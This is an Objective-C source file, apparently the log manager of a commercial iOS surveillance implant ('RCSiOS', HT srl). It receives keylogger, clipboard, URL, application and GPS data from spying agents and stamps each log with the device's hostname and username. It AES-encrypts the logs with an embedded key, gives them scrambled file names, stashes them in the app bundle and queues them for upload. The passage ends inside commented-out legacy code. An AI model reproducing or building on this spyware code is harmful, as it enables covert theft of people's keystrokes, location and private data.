/*
 * RCSiOS - Log Manager
 *  Logging facilities, this class is a singleton which will be referenced
 *  by RCSMCommunicationManager and all the single agents providing ways for
 *  writing log data per agentID or agentLogFileHandle.
 *
 *
 *  - Provide all the instance methods in order to access and remove items from
 *    the queues without the needs for external objects to access the queue
 *    directly, aka Keep It Pr1v4t3!
 *
 * Created on 16/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <mach/message.h>

#import "RCSILogManager.h"
#import "RCSIEncryption.h"
#import "RCSIGlobals.h"

//#define DEBUG_

#define MAX_LOG_IN_LOGSET         500
#define MAX_LOG_IN_LOGSET_REACHED -1
#define MAX_LOG_IN_LOGSET_ERROR   0

static _i_LogManager *sharedInstance = nil;

#pragma mark -
#pragma mark Log File Header Struct Definition
#pragma mark -

//
// First DWORD is not encrypted and specifies: sizeof(logStruct) + deviceIdLen + 
// userIdLen + sourceIdLen + uAdditionalData
//
typedef struct _log {
  u_int version;
#define LOG_VERSION   2008121901
  u_int type;
  u_int hiTimestamp;
  u_int loTimestamp;
  u_int deviceIdLength;       // IMEI/Hostname len
  u_int userIdLength;         // IMSI/Username len
  u_int sourceIdLength;       // Caller Number / IP length
  u_int additionalDataLength; // Size of additional data if present
} logStruct;

#pragma mark -
#pragma mark _i_syncLogSet
#pragma mark -

@implementation _i_syncLogSet

@synthesize mLogSetName;
@synthesize mLogSetPath;
@synthesize isRemovable;

- (id)initWithName:(NSString*)logSetName
{
  self = [super init];
  
  if (self != nil)
  {
    mLogSetName = [[NSString alloc] initWithString: logSetName];
    mLogSetPath = [[NSString alloc] initWithFormat: @"%@/%@", [[NSBundle mainBundle] bundlePath], logSetName];
    isRemovable = NO;
  }
  
  return self;
}

- (id)retain
{
  [mLogSetName retain];
  [mLogSetPath retain];
  
  return [super retain];
}

- (void)release
{
  [mLogSetName release];
  [mLogSetPath release];
}

@end

#pragma mark -
#pragma mark _i_Log
#pragma mark -

@implementation _i_Log

@synthesize mAgentId;
@synthesize mLogId;
@synthesize mLogFileHandle;

- (id)initWithAgentId:(int)agentId andLogId:(int)logId
{
  self = [super init];
  
  if (self != nil)
  {
    mAgentId = [[NSNumber alloc] initWithInt: agentId];
    mLogId   = [[NSNumber alloc] initWithInt: logId];
    mLogFileHandle = nil;
    mLogPath = nil;
    mLogName = nil;
    mSendableLogPath = nil;
    mSendableLogName = nil;
  }
  
  return self;
}

- (id)retain
{
  [mAgentId retain];
  [mLogId retain];
  [mLogPath retain];
  [mLogName retain];
  [mSendableLogPath retain];
  [mSendableLogName retain];
  [mLogFileHandle retain];
  
  return [super retain];
}

- (void)release
{
  [mAgentId release];
  [mLogId release];
  [mLogPath release];
  [mLogName release];
  [mSendableLogPath release];
  [mSendableLogName release];
  [mLogFileHandle release];
}

- (BOOL)setLogNameWithFolderName:(NSString*)logSetFolderName
                 usingEncryption:(_i_Encryption*)encryption
{
  BOOL success = TRUE;
  
  do
  {
    time_t unixTime;
    time(&unixTime);
    int64_t ftime  = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
    int32_t hiPart = (int64_t)ftime >> 32;
    int32_t loPart = (int64_t)ftime & 0xFFFFFFFF;
    
    NSString *logName = [[NSString alloc] initWithFormat:@"LOGF_%.4X_%.8X%.8X.log",
                                                         [mAgentId intValue],
                                                         hiPart,
                                                         loPart];

    mSendableLogName = [[NSString alloc] initWithFormat:@"%@", [encryption scrambleForward: logName seed: gLogAesKey[0]]];
    mSendableLogPath = [[NSString alloc] initWithFormat:@"%@/%@", logSetFolderName, mSendableLogName];
    
    mLogName = [[NSString alloc] initWithFormat:@"_%@", mSendableLogName];
    mLogPath = [[NSString alloc] initWithFormat:@"%@/%@", logSetFolderName, mLogName];
    
    [logName release];
  }
  while ([[NSFileManager defaultManager] fileExistsAtPath: mLogPath] == TRUE);
  
  return success;
}

- (BOOL)createLogFileHandle
{
  NSError *error;
  
  BOOL retVal = [@"" writeToFile: mLogPath
                      atomically: NO
                        encoding: NSUnicodeStringEncoding
                           error: &error];
  if (retVal == TRUE)
  {
    mLogFileHandle = [[NSFileHandle fileHandleForUpdatingAtPath: mLogPath] retain];
  }
  
  if (mLogFileHandle == nil)
    return FALSE;
  else
    return TRUE;
}

- (void)closeLogFileHandle
{
  if (mLogFileHandle != nil)
  {
    [mLogFileHandle closeFile];
  }
}

- (BOOL)setSendable:(NSString*)logSetPathName
{
  BOOL retVal = TRUE;
  
  retVal = [[NSFileManager defaultManager] moveItemAtPath: mLogPath toPath: mSendableLogPath error: nil];
  
  return retVal;
}

@end

#pragma mark -
#pragma mark _i_LogSet
#pragma mark -

@implementation _i_LogSet

@synthesize mLogSetFolderName;

- (id)initWithEncryption:(_i_Encryption*)encryption
{
  self = [super init];
  
  if (self != nil)
  {
    mLogsArray = [[NSMutableArray alloc] initWithCapacity:0];
    
    [self setupLogSetFolderName];
    [self createLogSetFolder];
    mEncryption = encryption;
    
    mLogCount = 0;
  }
  
  return self;
}

- (id)retain
{
  [mLogsArray retain];
  [mLogSetFolderPath retain];
  [mLogSetFolderName retain];
  
  return [super retain];
}

- (void)release
{
  [mLogsArray release];
  [mLogSetFolderPath release];
  [mLogSetFolderName release];
}

- (void)setupLogSetFolderName
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  time_t unixTime;
  
  time(&unixTime);
  
  int64_t ftime  = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  int32_t hiPart = (int64_t)ftime >> 32;
  int32_t loPart = (int64_t)ftime & 0xFFFFFFFF;
  
  mLogSetFolderName = [[NSString alloc] initWithFormat: @"0000%.8X%.8X", hiPart, loPart];
  
  mLogSetFolderPath = [[NSString alloc] initWithFormat:@"%@/%@",
                                                       [[NSBundle mainBundle] bundlePath],
                                                       mLogSetFolderName];
  
  [pool release];
}

- (BOOL)createLogSetFolder
{
  NSFileManager *currFM = [NSFileManager defaultManager];
  
  if ([currFM fileExistsAtPath: mLogSetFolderPath] == FALSE)
  {
    if ([currFM createDirectoryAtPath:mLogSetFolderPath
          withIntermediateDirectories:YES
                           attributes:nil
                                error:nil] == FALSE)
      return FALSE;
  }
  
  return TRUE;
}

#pragma mark -
#pragma mark Logs management
#pragma mark -

- (int)logsCount
{
  return [mLogsArray count];
}

- (int)addLogToQueue:(_i_Log*)log
{
  [mLogsArray addObject: log];
  return ++mLogCount;
}

- (void)delLogFromQueue:(_i_Log*)log
{
  [mLogsArray removeObject: log];
}

- (int)addLogWithAgentId:(int)agentId andLogId:(int)logId
{
  int count;
  
  if (mLogCount > MAX_LOG_IN_LOGSET)
    return MAX_LOG_IN_LOGSET_REACHED;
  
  _i_Log *log = [[_i_Log alloc] initWithAgentId:agentId andLogId:logId];
  
  [log setLogNameWithFolderName: mLogSetFolderPath usingEncryption: mEncryption];
  
  if ([log createLogFileHandle] == FALSE)
  {
    [log release];
    return MAX_LOG_IN_LOGSET_ERROR;
  }
  
  count = [self addLogToQueue: log];
  
  [log release];
  
  return count;
}

- (BOOL)delLogWithAgentId:(int)agentId andLogId:(int)logId
{
  BOOL success = FALSE;
  
  _i_Log *tmpLog;
  
  for (int i=0;  i < [mLogsArray count]; i++)
  {
    tmpLog = [mLogsArray objectAtIndex:i];
    
    if ([[tmpLog mAgentId] intValue] == agentId &&
        [[tmpLog mLogId] intValue] == logId)
    {
      [tmpLog closeLogFileHandle];
      
      [tmpLog setSendable: mLogSetFolderPath];
      
      [self delLogFromQueue: tmpLog];
      
      success = TRUE;      
      break;
    }
  }
  
  return success;
}

- (BOOL)appendLogData:(NSData*)data forAgentId:(int)agentId andLogId:(int)logId
{
  BOOL retVal = FALSE;
  _i_Log *tmpLog;
  
  for (int i=0;  i < [mLogsArray count]; i++)
  {
    tmpLog = [mLogsArray objectAtIndex:i];
    
    if ([[tmpLog mAgentId] intValue] == agentId &&
        ([[tmpLog mLogId] intValue] == logId || logId ==0))
    {
      if ([tmpLog mLogFileHandle] != nil)
      {
        [[tmpLog mLogFileHandle] writeData: data];
        retVal = TRUE;
      }
      break;
    }
  }
  
  return retVal;
}


- (BOOL)isSerialLog: (NSNumber*)agentID
{
  BOOL success = FALSE;
  
  switch ([agentID intValue])
  {
    case LOG_URL:
    case LOG_APPLICATION:
    case LOG_KEYLOG:
    case LOG_CLIPBOARD:
    case LOGTYPE_LOCATION_NEW:
      success = TRUE;
      break;
  }
  return success;
}

- (void)closeLogSetLogs
{
  for (int i = ([mLogsArray count] - 1); i >= 0; i--)
  {
    _i_Log *log = [mLogsArray objectAtIndex:i];
    
    if ([self isSerialLog: [log mAgentId]])
    {
      [log closeLogFileHandle];
      
      [log setSendable:mLogSetFolderPath];
      
      [self delLogFromQueue: log];
    }
  }
}

@end

#pragma mark -
#pragma mark _i_LogManager
#pragma mark -

@implementation _i_LogManager

@synthesize notificationPort;

+ (_i_LogManager *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
    {
      [[self alloc] init];
    }
  }
  
  return sharedInstance;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
    {
      sharedInstance = [super allocWithZone: aZone];
      
      return sharedInstance;
    }
  }
  
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedInstance != nil)
    {
      self = [super init];
      
      if (self != nil)
      {
        mLogMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
        
        NSData *temp = [NSData dataWithBytes: gLogAesKey
                                      length: CC_MD5_DIGEST_LENGTH];
        
        mEncryption = [[_i_Encryption alloc] initWithKey:temp];
        
        mCurrLogSet = [[_i_LogSet alloc] initWithEncryption:mEncryption];
        
        mLogSetArray = [[NSMutableArray alloc] initWithCapacity:0];
        
        [mLogSetArray addObject: mCurrLogSet];
        
        [mCurrLogSet release];
      }
      
      sharedInstance = self;
    }
  }
  
  return sharedInstance;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Logs support routine
#pragma mark -

- (NSMutableData*)createRawHeader:(NSMutableData*)logHeader
                     withHostName:(NSString*)hostName
                         userName:(NSString*)userName
                   andAgentHeader:(NSData*)anAgentHeader
                 withHeaderLength:(int*)headerLength
{
  logStruct *logRawHeader = (logStruct*)[logHeader bytes];
  
  *headerLength = sizeof(logStruct) +
                  logRawHeader->deviceIdLength +
                  logRawHeader->userIdLength +
                  logRawHeader->sourceIdLength +
                  logRawHeader->additionalDataLength;
  
  int paddedLength = *headerLength;
  
  if (paddedLength % kCCBlockSizeAES128)
  {
    int pad = (paddedLength + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - paddedLength;
    paddedLength += pad;
  }
  
  paddedLength += sizeof(int);
  
  if (paddedLength < *headerLength)
  {
    [logHeader release];
    return nil;
  }
  
  NSMutableData *rawHeader = [NSMutableData dataWithCapacity: [logHeader length]
                              + [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                              + [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                              + [anAgentHeader length]];
  
  // Clear dword at the start of the file which specifies the size of the
  // unencrypted data
  *headerLength = paddedLength - sizeof(int);
  
  [rawHeader appendData: logHeader];
  [rawHeader appendData: [hostName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [rawHeader appendData: [userName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  if (anAgentHeader != nil)
    [rawHeader appendData: anAgentHeader];
  
  return rawHeader;
  
}

- (NSMutableData*)createlogRawHeader:(int)agentID
                        withHostname:(NSString*)hostName
                            username:(NSString*)userName
                         agentHeader:(NSData*)anAgentHeader
{
  time_t unixTime;
  time(&unixTime);
  int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  
  logStruct *logRawHeader;
  NSMutableData *logHeader = [[NSMutableData dataWithLength: sizeof(logStruct)] retain];
  
  logRawHeader = (logStruct *)[logHeader bytes];
  
  logRawHeader->version        = LOG_VERSION;
  logRawHeader->type           = agentID;
  logRawHeader->hiTimestamp    = (int64_t)filetime >> 32;
  logRawHeader->loTimestamp    = (int64_t)filetime & 0xFFFFFFFF;
  logRawHeader->deviceIdLength = [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  logRawHeader->userIdLength   = [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  logRawHeader->sourceIdLength = 0;
  
  if (anAgentHeader != nil && anAgentHeader != 0)
    logRawHeader->additionalDataLength = [anAgentHeader length];
  else
    logRawHeader->additionalDataLength = 0;
  
  return logHeader;
}

- (NSString*)createLogHostName
{
  NSString *hostName;
  char tempHost[256];
  
  if (gethostname(tempHost, 100) == 0)
  {
    hostName = [NSString stringWithCString: tempHost
                                  encoding: NSUTF8StringEncoding];
  }
  else
    hostName = @"EMPTY";
  
  return hostName;
}

- (NSString*)createLogUserName
{
  NSString *userName = NSUserName();
  return  userName;
}

- (NSData *)createLogHeader: (u_int)agentID
                agentHeader: (NSData*)anAgentHeader
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  int headerLength;
  
  NSString *hostName = [self createLogHostName];
  
  NSString *userName = [self createLogUserName];
  
  NSMutableData *logRawHeader = [self createlogRawHeader:agentID
                                            withHostname:hostName
                                                username:userName
                                             agentHeader:anAgentHeader];
  
  NSMutableData *rawHeader = [self createRawHeader:logRawHeader
                                      withHostName:hostName
                                          userName:userName
                                    andAgentHeader:anAgentHeader
                                  withHeaderLength:&headerLength];
  
  NSData *temp = [NSData dataWithBytes: gLogAesKey
                                length: CC_MD5_DIGEST_LENGTH];
  
  CCCryptorStatus result = 0;
  
  // no padding on aligned block
  result = [rawHeader __encryptWithKey: temp];

  if (result == kCCSuccess)
  {
    NSMutableData *header = [NSMutableData dataWithCapacity: headerLength + sizeof(int)];
    [header appendBytes: &headerLength length: sizeof(int)];
    [header appendData: rawHeader];
    [header retain];
    [logRawHeader release];
    [outerPool release];
    
    return header;
  }
  
  [logRawHeader release];
  
  [outerPool release];
  
  return nil;
}

- (NSMutableData*)encLogData:(NSMutableData*)aData
{
  NSMutableData *encData = nil;
  
  CCCryptorStatus result  = 0;
  
  if (aData == nil)
    return nil;
  
  encData = [[NSMutableData alloc] initWithData: aData];
  
  NSData *temp = [NSData dataWithBytes: gLogAesKey
                                length: CC_MD5_DIGEST_LENGTH];
  
  // no padding on aligned blocks
  result = [encData __encryptWithKey:temp];
  
  if (result != kCCSuccess)
  {
    [encData release];
    return nil;
  }
  
  return encData;
}

- (BOOL)createNewLogSet
{
  [mCurrLogSet closeLogSetLogs];
  
  if ([mCurrLogSet logsCount] == 0)
  {
    [mLogSetArray removeObject: mCurrLogSet];
  }
  
  mCurrLogSet = [[_i_LogSet alloc] initWithEncryption:mEncryption];
  
  [mLogSetArray addObject: mCurrLogSet];
  
  [mCurrLogSet release];
  
  return TRUE;
}

#pragma mark -
#pragma mark Logs life cycle routine
#pragma mark -

- (BOOL)createLog:(u_int)agentID
      agentHeader:(NSData *)anAgentHeader
        withLogID:(unsigned int)logID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  BOOL success = FALSE;
  
  NSData *logHeader = [self createLogHeader: agentID agentHeader:anAgentHeader];
  
  @synchronized(self)
  {
    int retVal = [mCurrLogSet addLogWithAgentId: agentID andLogId: logID];
    
    switch (retVal)
    {
      case MAX_LOG_IN_LOGSET_ERROR:
      {
        success = FALSE;
        break;
      }
      case MAX_LOG_IN_LOGSET_REACHED:
      {
        [self createNewLogSet];
        
        if ([mCurrLogSet addLogWithAgentId: agentID andLogId: logID] > 0)
        {
          success = [mCurrLogSet appendLogData:logHeader forAgentId:agentID andLogId:logID];
        }
        break;
      }
      default:
      {
        success = [mCurrLogSet appendLogData:logHeader forAgentId:agentID andLogId:logID];
        break;
      }
    }
  }
  
  [logHeader release];
  
  [outerPool release];
  
  return success;
}

- (BOOL)writeDataToLog: (NSMutableData *)aData
              forAgent: (u_int)agentID
             withLogID: (u_int)logID
{
  BOOL dataWrote = FALSE;

  if (aData == nil)
    return dataWrote;
  
  NSMutableData *encData = [self encLogData:aData];

  if (encData == nil)
  {
    return dataWrote;
  }
  
  // lunghezza no padded: per corretta decodifica
  int _blockSize = [aData length];
  
  NSMutableData *dataBlock = [NSMutableData dataWithCapacity: (sizeof(int) + [encData length])];

  [dataBlock appendBytes: &_blockSize length:sizeof(int)];
  [dataBlock appendData: encData];
  
  @synchronized(self)
  {
    dataWrote = [mCurrLogSet appendLogData:dataBlock forAgentId:agentID andLogId:logID];
    
    if (dataWrote == FALSE)
    {
      /*
       * try find log in older logSet
       */
      for (int i=0; i < [mLogSetArray count]; i++)
      {
        _i_LogSet *logSet = [mLogSetArray objectAtIndex:i];
        
        if (logSet == mCurrLogSet)
          continue;
        
        dataWrote = [logSet appendLogData: dataBlock forAgentId:agentID andLogId:logID];
        
        if (dataWrote == TRUE)
          break;
      }
    }
  }

  [encData release];

  return dataWrote;
}

- (BOOL)closeActiveLog: (u_int)agentID
             withLogID: (u_int)logID
{
  BOOL logClosed = FALSE;

  @synchronized(self)
  {
    logClosed = [mCurrLogSet delLogWithAgentId:agentID andLogId:logID];
    
    if (logClosed == FALSE)
    {
      /*
       * try find log in older logSet
       */
      for (int i=0; i < [mLogSetArray count]; i++)
      {
        _i_LogSet *logSet = [mLogSetArray objectAtIndex:i];
        
        if (logSet == mCurrLogSet)
          continue;
        
        logClosed = [logSet delLogWithAgentId:agentID andLogId:logID];
        
        if (logClosed == TRUE)
          break;
      }
    }
  }
  
  return logClosed;
}

- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging
{
  @synchronized(self)
  {
    [self createNewLogSet];
  }
  
  return TRUE;
}

- (BOOL)isLogSetRemovable:(NSString*)logSetName
{
  BOOL success = TRUE;
  
  @synchronized(self)
  {
    for (int i = 0 ; i < [mLogSetArray count]; i++)
    {
      _i_LogSet *logSet = [mLogSetArray objectAtIndex:i];
      
      if ([logSetName compare: [logSet mLogSetFolderName]] == 0)
      {
        if ([logSet logsCount] > 0)
          success = FALSE;
             
        break;
      }
    }
  }
  
  return success;
}

- (NSMutableArray*)syncableLogSetArray
{
  NSString *currLogSet = [[mCurrLogSet mLogSetFolderName] copy];
  
  NSMutableArray *logSetArray = [NSMutableArray arrayWithCapacity:0];

  NSArray *content = [[NSFileManager defaultManager] contentsOfDirectoryAtPath: [[NSBundle mainBundle] bundlePath]
                                                                         error: nil];
  NSRange range;
  range.location = 0;
  range.length   = 4;
  
  for (int i=0; i < [content count]; i++)
  {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
    NSString *fileName = (NSString*) [content objectAtIndex:i];
    
    if ([[fileName substringWithRange:range] compare: @"0000"])
    {
      [inner release];
      continue;
    }
    
    NSString *filePath = [NSString stringWithFormat: @"%@/%@" , [[NSBundle mainBundle] bundlePath], fileName];
    
    NSDictionary *attrib = [[NSFileManager defaultManager] attributesOfItemAtPath:filePath
                                                                            error:nil];
   
    NSString *fileType = [attrib objectForKey: NSFileType];
    
    if (fileType == NSFileTypeDirectory &&
        [fileName compare: currLogSet])
    {
      _i_syncLogSet *logSet = [[_i_syncLogSet alloc] initWithName: fileName];
      
      [logSet setIsRemovable:[self isLogSetRemovable: fileName]];
      
      [logSetArray addObject: logSet];
      
      [logSet release];
    }
    
    [inner release];
  }
  
  [currLogSet release];
  
  return logSetArray;
}

#pragma mark -
#pragma mark LogManager routine
#pragma mark -

#define IS_HEADER_MANDATORY(x) ((x & 0xFFFF0000))

- (BOOL)processNewLog:(NSData *)aData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  NSMutableData *payload;
  
  if (aData == nil)
    return FALSE;
  
  shMemoryLog *shMemLog = (shMemoryLog *)[aData bytes];

  /*
   * Keylog stream is:
   *   <0x0000,timestruct,process,null,window,null,DELIMETER,keystrokes...0x0000
   *   timestruct,process,null,window,null,DELIMETER,keystrokes....>
   */
  if (shMemLog->agentID == LOG_KEYLOG)
  {
    if (IS_HEADER_MANDATORY(shMemLog->flag))
    {
      /*
       * is mandatory if a app is started or re-opened from bg...
       */
      payload = [NSMutableData dataWithBytes: shMemLog->commandData
                                      length: shMemLog->commandDataSize];
    }
    else
    {
      /*
       * only keystrokes will be appended in log streams
       */
      int off = (shMemLog->flag & 0x0000FFFF);
      payload = [NSMutableData dataWithBytes: shMemLog->commandData + off
                                      length: shMemLog->commandDataSize - off];
    }
  }
  else
    if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
    {
      payload = [NSMutableData dataWithBytes:shMemLog->commandData + sizeof(LocationAdditionalData)
                                      length:sizeof(GPSInfo)];
    }
    else
    {
      payload = [NSMutableData dataWithBytes: shMemLog->commandData
                                      length: shMemLog->commandDataSize];
    }
  
  // Log chunck have always type setted:
  // Snapshot agents create, data, close
  // other only data
  switch (shMemLog->commandType)
  {
    case CM_CREATE_LOG_HEADER:
    {
      [self createLog: shMemLog->agentID
          agentHeader: payload
            withLogID: shMemLog->logID];
      break;
    }
    case CM_LOG_DATA:
    {
      // log streaming closed by sync: recreate and append whole log
      // log screenshot: first chunk of new images with new logID
      if ([self writeDataToLog: payload
                      forAgent: shMemLog->agentID
                     withLogID: shMemLog->logID] == FALSE)
      {
//        if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
//        {
//          [self createAndWritePositionLog: aData];
//        }
//        else
        if ([self createLog:shMemLog->agentID
                agentHeader:nil
                  withLogID:shMemLog->logID])
        {
          /*
           * the window and process info must be stored
           * because sync recreate the log stream
           */
          if (shMemLog->agentID == LOG_KEYLOG)
          {
            payload = [NSMutableData dataWithBytes: shMemLog->commandData
                                            length: shMemLog->commandDataSize];
          }
          
          [self writeDataToLog:payload
                      forAgent:shMemLog->agentID
                     withLogID:shMemLog->logID];
        }
      }
      break;
    }
    case CM_CLOSE_LOG:
    {
      // Write latest block and close
      [self writeDataToLog:payload
                  forAgent:shMemLog->agentID
                 withLogID:shMemLog->logID];
      
      [self closeActiveLog: shMemLog->agentID
                 withLogID: shMemLog->logID];
      
      break;
    }
    default:
      break;
  }
  
  [pool release];
  
  return TRUE;
}

- (BOOL)addMessage: (NSData*)aMessage
{
  // messages removed by handleMachMessage
  @synchronized(mLogMessageQueue)
  {
    [mLogMessageQueue addObject: aMessage];
  }
  
  return TRUE;
}

typedef struct _coreMessage_t
{
  mach_msg_header_t header;
  uint dataLen;
} coreMessage_t;

// handle the incomings logs
- (void) handleMachMessage:(void *) msg
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  coreMessage_t *coreMsg = (coreMessage_t*)msg;
  
  NSData *theData = [NSData dataWithBytes: ((u_char*)msg + sizeof(coreMessage_t))
                                   length: coreMsg->dataLen];
  
  [self addMessage: theData];
  
  [pool release];
}

// Process new incoming logs
-(int)processIncomingLogs
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *tmpMessages;
  
  @synchronized(mLogMessageQueue)
  {
    tmpMessages = [[mLogMessageQueue copy] autorelease];
    [mLogMessageQueue removeAllObjects];
  }

  int logCount = [tmpMessages count];
  
  for (int i=0; i < logCount; i++)
  {
    [self processNewLog: [tmpMessages objectAtIndex:i]];
  }
  
  [pool release];
  
  return logCount;
}

NSString *kRunLoopLogManagerMode = @"kRunLoopLogManagerMode";

- (void)logManagerRunLoop
{
  NSRunLoop *logManagerRunLoop = [NSRunLoop currentRunLoop];
  
  notificationPort = [[NSMachPort alloc] init];
  [notificationPort setDelegate: self];
  
  [logManagerRunLoop addPort: notificationPort
                     forMode: kRunLoopLogManagerMode];
  
  // run the log loop: _i_Core send notification to this
  // this thread won't be never stopped...
  while (TRUE)
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    [logManagerRunLoop runMode: kRunLoopLogManagerMode
                    beforeDate: [NSDate dateWithTimeIntervalSinceNow:1.5]];
    
    // process incoming logs out of the runloop
    [self processIncomingLogs];
    
    [pool release];
  }
}

- (void)start
{
  [NSThread detachNewThreadSelector: @selector(logManagerRunLoop)
                           toTarget: self withObject:nil];
}

@end

//@implementation _i_LogManager
//
//@synthesize notificationPort;
//@synthesize mCurrLogFolder;
//
//
//#pragma mark -
//#pragma mark Class and init methods
//#pragma mark -
//
//+ (_i_LogManager *)sharedInstance
//{
//  @synchronized(self)
//  {
//    if (sharedInstance == nil)
//      {
//        //
//        // Assignment is not done here
//        //
//        [[self alloc] init];
//      }
//  }
//  
//  return sharedInstance;
//}
//
//+ (id)allocWithZone: (NSZone *)aZone
//{
//  @synchronized(self)
//  {
//    if (sharedInstance == nil)
//      {
//        sharedInstance = [super allocWithZone: aZone];
//        
//        //
//        // Assignment and return on first allocation
//        //
//        return sharedInstance;
//      }
//  }
//  
//  // On subsequent allocation attemps return nil
//  return nil;
//}
//
//- (id)copyWithZone: (NSZone *)aZone
//{
//  return self;
//}
//
//- (id)init
//{
//  Class myClass = [self class];
//  
//  @synchronized(myClass)
//    {
//      if (sharedInstance != nil)
//        {
//          self = [super init];
//          
//          if (self != nil)
//            {
//              mNoAutoQueuedLogs = [[NSMutableArray alloc] init];
//              mAutoQueuedLogs   = [[NSMutableArray alloc] init];              
//              mSendQueue = [[NSMutableArray alloc] init];
//
//              NSData *temp = [NSData dataWithBytes: gLogAesKey
//                                            length: CC_MD5_DIGEST_LENGTH];
//              
//              mEncryption = [[_i_Encryption alloc] initWithKey: temp];
//              mLogMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
//              
//              [self setMCurrLogFolder: [self createAndGetCurrLogsFolder]];
//            }
//          
//          sharedInstance = self;
//        }
//    }
//  
//  return sharedInstance;
//}
//
//- (id)retain
//{
//  return self;
//}
//
//- (unsigned)retainCount
//{
//  // Denotes an object that cannot be released
//  return UINT_MAX;
//}
//
//- (void)release
//{
//  // Do nothing
//}
//
//- (id)autorelease
//{
//  return self;
//}
//
//#pragma mark -
//#pragma mark Logging facilities
//#pragma mark -
//
//- (BOOL)createCurrLogsFolder:(NSString*)logsFolderPath
//{
//  NSFileManager *currFM = [NSFileManager defaultManager];
//  
//  if ([currFM fileExistsAtPath: logsFolderPath] == FALSE)
//  {
//    if ([currFM createDirectoryAtPath:logsFolderPath attributes: nil] == FALSE)
//      return FALSE;
//  }
//  
//  return TRUE;
//}
//
//- (NSString*)createAndGetCurrLogsFolder
//{
//  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
//  
//  NSString *logDir;
//  time_t unixTime;
//  
//  @synchronized(self)
//  {
//    time(&unixTime);
//    
//    int64_t ftime  = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
//    int32_t hiPart = (int64_t)ftime >> 32;
//    int32_t loPart = (int64_t)ftime & 0xFFFFFFFF;
//    
//    logDir = [[NSString alloc] initWithFormat: @"%.8X%.8X", hiPart, loPart];
//    
//    NSString *pathLogDir = [NSString stringWithFormat:@"%@/%@",
//                                                    [[NSBundle mainBundle] bundlePath],
//                                                    logDir];
//    
//    if ([self createCurrLogsFolder: pathLogDir] == FALSE)
//    {
//      [logDir release];
//      logDir = nil;
//    }
//  }
//  
//  [pool release];
//  
//  return logDir;
//}
//
//- (NSString*)getCurrLogsFolder
//{
//  @synchronized(self)
//  {
//    if (mCurrLogFolder == nil)
//    {
//      [self setMCurrLogFolder: [self createAndGetCurrLogsFolder]];
//    }
//  }
//  
//  return mCurrLogFolder;
//}
//
//- (NSMutableArray*)getLogQueue: (u_int)agentID andLogID:(u_int)logID
//{
//  NSMutableArray *aQueue = mAutoQueuedLogs;
// 
//  switch (agentID) 
//  {
//    case LOG_URL:
//      aQueue = mNoAutoQueuedLogs;
//      break;
//    case LOG_APPLICATION:
//      aQueue = mNoAutoQueuedLogs;
//      break;
//    case LOG_KEYLOG:
//      aQueue = mNoAutoQueuedLogs;
//      break;
//    case LOG_CLIPBOARD:
//      aQueue = mNoAutoQueuedLogs;
//      break;
//    case LOGTYPE_LOCATION_NEW:
//      if(logID == LOGTYPE_LOCATION_GPS)
//        aQueue = mNoAutoQueuedLogs;
//      else if (logID == LOGTYPE_LOCATION_WIFI)
//        aQueue = mAutoQueuedLogs;
//    break;
//  }
//
//  return aQueue;
//}
//
//- (NSData *)createLogHeader: (u_int)agentID
//                   timestamp: (int64_t)fileTime
//                 agentHeader: (NSData *)anAgentHeader
//{
//  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
//
//  char tempHost[100];
//  NSString *hostName;
//  
//  if (gethostname(tempHost, 100) == 0)
//    hostName = [NSString stringWithCString: tempHost
//                                  encoding: NSUTF8StringEncoding];
//  else
//    hostName = @"EMPTY";
//  
//  NSString *userName = NSUserName();
//  
//  logStruct *logRawHeader;
//  NSMutableData *logHeader = [[NSMutableData dataWithLength: sizeof(logStruct)] retain];
//
//  logRawHeader = (logStruct *)[logHeader bytes];
//  
//  logRawHeader->version        = LOG_VERSION;
//  logRawHeader->type           = agentID;
//  logRawHeader->hiTimestamp    = (int64_t)fileTime >> 32;
//  logRawHeader->loTimestamp    = (int64_t)fileTime & 0xFFFFFFFF;
//  logRawHeader->deviceIdLength = [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
